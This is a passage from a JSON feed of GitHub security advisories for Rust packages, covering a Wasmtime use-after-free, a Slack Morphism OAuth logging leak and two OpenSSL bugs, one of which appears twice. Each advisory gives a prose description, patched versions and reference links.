            "content_html": "<p>There is a bug in Wasmtime's code generator, Cranelift, where functions using reference types may be incorrectly missing metadata required for runtime garbage collection (GC). This means that if a GC happens at runtime then the collector will mistakenly think some Wasm stack frames do not have live references to garbage collected values and therefore reclaim and deallocate them. The function can then subsequently continue to use the values, leading later to use-after-free bugs. This bug was introduced in Cranelift's migration to the <code>regalloc2</code> register allocator in the Wasmtime 0.37.0 release on 2022-05-20. This bug has been patched and users should upgrade to Wasmtime version 0.38.2.</p>\n<p>Mitigations for this issue can be achieved by doing one of:</p>\n<ul>\n<li>Disabling the reference types proposal by passing <code>false</code> to <a href=\"https://docs.rs/wasmtime/0.38.0/wasmtime/struct.Config.html#method.wasm_reference_types\"><code>wasmtime::Config::wasm_reference_types</code></a>.</li>\n<li>Downgrading to Wasmtime 0.36.0 or prior.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-5fhj-g3p3-pq9g\">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-5fhj-g3p3-pq9g</a></li>\n<li><a href=\"https://github.com/bytecodealliance/wasmtime/commit/2ba4bce5cc719e5a74e571a534424614e62ecc41\">https://github.com/bytecodealliance/wasmtime/commit/2ba4bce5cc719e5a74e571a534424614e62ecc41</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-31146\">https://nvd.nist.gov/vuln/detail/CVE-2022-31146</a></li>\n<li><a href=\"https://github.com/WebAssembly/reference-types\">https://github.com/WebAssembly/reference-types</a></li>\n<li><a href=\"https://github.com/bytecodealliance/wasmtime/\">https://github.com/bytecodealliance/wasmtime/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5fhj-g3p3-pq9g\">https://github.com/advisories/GHSA-5fhj-g3p3-pq9g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5fhj-g3p3-pq9g",
            "title": "[wasmtime] Wasmtime vulnerable to Use After Free with `externref`s",
            "date_modified": "2022-08-05T13:56:04.000Z",
            "date_published": "2022-07-20T22:47:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5fhj-g3p3-pq9g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Potential/accidental leaking of Slack OAuth client information in application debug logs.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>More strict and secure debug formatting was introduced in v0.41 for OAuth secret types to avoid the possibility of printing sensitive information in application logs.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Don't print/output in logs request and responses for OAuth and client configurations.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in the <a href=\"https://github.com/abdolence/slack-morphism-rust\">repo</a></li>\n<li>Email us at <a href=\"mailto:me@abdolence.dev\">me@abdolence.dev</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/abdolence/slack-morphism-rust/security/advisories/GHSA-99j7-mhfh-w84p\">https://github.com/abdolence/slack-morphism-rust/security/advisories/GHSA-99j7-mhfh-w84p</a></li>\n<li><a href=\"https://github.com/abdolence/slack-morphism-rust/releases/tag/v0.41.0\">https://github.com/abdolence/slack-morphism-rust/releases/tag/v0.41.0</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-31162\">https://nvd.nist.gov/vuln/detail/CVE-2022-31162</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-99j7-mhfh-w84p\">https://github.com/advisories/GHSA-99j7-mhfh-w84p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-99j7-mhfh-w84p",
            "title": "[slack-morphism] Slack Morphism for Rust before 0.41.0 can leak Slack OAuth client information in application debug logs",
            "date_modified": "2022-08-10T23:31:07.000Z",
            "date_published": "2022-07-20T01:30:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-99j7-mhfh-w84p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The OpenSSL 3.0.4 release introduced a serious bug in the RSA implementation for X86_64 CPUs supporting the AVX512IFMA instructions. This issue makes the RSA implementation with 2048 bit private keys incorrect on such machines and memory corruption will happen during the computation. As a consequence of the memory corruption an attacker may be able to trigger a remote code execution on the machine performing the computation. SSL/TLS servers or other servers using 2048 bit RSA private keys running on machines supporting AVX512IFMA instructions of the X86_64 architecture are affected by this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-2274\">https://nvd.nist.gov/vuln/detail/CVE-2022-2274</a></li>\n<li><a href=\"https://github.com/openssl/openssl/issues/18625\">https://github.com/openssl/openssl/issues/18625</a></li>\n<li><a href=\"https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=4d8a88c134df634ba610ff8db1eb8478ac5fd345\">https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=4d8a88c134df634ba610ff8db1eb8478ac5fd345</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2022-0033.html\">https://rustsec.org/advisories/RUSTSEC-2022-0033.html</a></li>\n<li><a href=\"https://www.openssl.org/news/secadv/20220705.txt\">https://www.openssl.org/news/secadv/20220705.txt</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20220715-0010/\">https://security.netapp.com/advisory/ntap-20220715-0010/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-735f-pg76-fxc4\">https://github.com/advisories/GHSA-735f-pg76-fxc4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-735f-pg76-fxc4",
            "title": "[openssl-src] openssl-src 300.0.8 heap memory corruption with RSA private key operation",
            "date_modified": "2022-07-21T16:22:23.000Z",
            "date_published": "2022-07-02T00:00:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-735f-pg76-fxc4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>AES OCB mode for 32-bit x86 platforms using the AES-NI assembly optimised\nimplementation will not encrypt the entirety of the data under some\ncircumstances.  This could reveal sixteen bytes of data that was\npreexisting in the memory that wasn't written.  In the special case of\n\"in place\" encryption, sixteen bytes of the plaintext would be revealed.</p>\n<p>Since OpenSSL does not support OCB based cipher suites for TLS and DTLS,\nthey are both unaffected.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-2097\">https://nvd.nist.gov/vuln/detail/CVE-2022-2097</a></li>\n<li><a href=\"https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=919925673d6c9cfed3c1085497f5dfbbed5fc431\">https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=919925673d6c9cfed3c1085497f5dfbbed5fc431</a></li>\n<li><a href=\"https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=a98f339ddd7e8f487d6e0088d4a9a42324885a93\">https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=a98f339ddd7e8f487d6e0088d4a9a42324885a93</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2022-0032.html\">https://rustsec.org/advisories/RUSTSEC-2022-0032.html</a></li>\n<li><a href=\"https://www.openssl.org/news/secadv/20220705.txt\">https://www.openssl.org/news/secadv/20220705.txt</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/V6567JERRHHJW2GNGJGKDRNHR7SNPZK7/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/V6567JERRHHJW2GNGJGKDRNHR7SNPZK7/</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/R6CK57NBQFTPUMXAPJURCGXUYT76NQAK/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/R6CK57NBQFTPUMXAPJURCGXUYT76NQAK/</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20220715-0011/\">https://security.netapp.com/advisory/ntap-20220715-0011/</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VCMNWKERPBKOEBNL7CLTTX3ZZCZLH7XA/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VCMNWKERPBKOEBNL7CLTTX3ZZCZLH7XA/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3wx7-46ch-7rq2\">https://github.com/advisories/GHSA-3wx7-46ch-7rq2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3wx7-46ch-7rq2",
            "title": "[openssl-src] AES OCB fails to encrypt some bytes",
            "date_modified": "2022-07-25T18:25:40.000Z",
            "date_published": "2022-07-06T19:57:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3wx7-46ch-7rq2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>AES OCB mode for 32-bit x86 platforms using the AES-NI assembly optimised\nimplementation will not encrypt the entirety of the data under some\ncircumstances.  This could reveal sixteen bytes of data that was\npreexisting in the memory that wasn't written.  In the special case of\n\"in place\" encryption, sixteen bytes of the plaintext would be revealed.</p>\n<p>Since OpenSSL does not support OCB based cipher suites for TLS and DTLS,\nthey are both unaffected.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-2097\">https://nvd.nist.gov/vuln/detail/CVE-2022-2097</a></li>\n<li><a href=\"https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=919925673d6c9cfed3c1085497f5dfbbed5fc431\">https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=919925673d6c9cfed3c1085497f5dfbbed5fc431</a></li>\n<li><a href=\"https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=a98f339ddd7e8f487d6e0088d4a9a42324885a93\">https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=a98f339ddd7e8f487d6e0088d4a9a42324885a93</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2022-0032.html\">https://rustsec.org/advisories/RUSTSEC-2022-0032.html</a></li>\n<li><a href=\"https://www.openssl.org/news/secadv/20220705.txt\">https://www.openssl.org/news/secadv/20220705.txt</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/V6567JERRHHJW2GNGJGKDRNHR7SNPZK7/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/V6567JERRHHJW2GNGJGKDRNHR7SNPZK7/</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/R6CK57NBQFTPUMXAPJURCGXUYT76NQAK/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/R6CK57NBQFTPUMXAPJURCGXUYT76NQAK/</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20220715-0011/\">https://security.netapp.com/advisory/ntap-20220715-0011/</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VCMNWKERPBKOEBNL7CLTTX3ZZCZLH7XA/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VCMNWKERPBKOEBNL7CLTTX3ZZCZLH7XA/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3wx7-46ch-7rq2\">https://github.com/advisories/GHSA-3wx7-46ch-7rq2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3wx7-46ch-7rq2",
            "title": "[openssl-src] AES OCB fails to encrypt some bytes",
            "date_modified": "2022-07-25T18:25:40.000Z",
            "date_published": "2022-07-06T19:57:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3wx7-46ch-7rq2"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}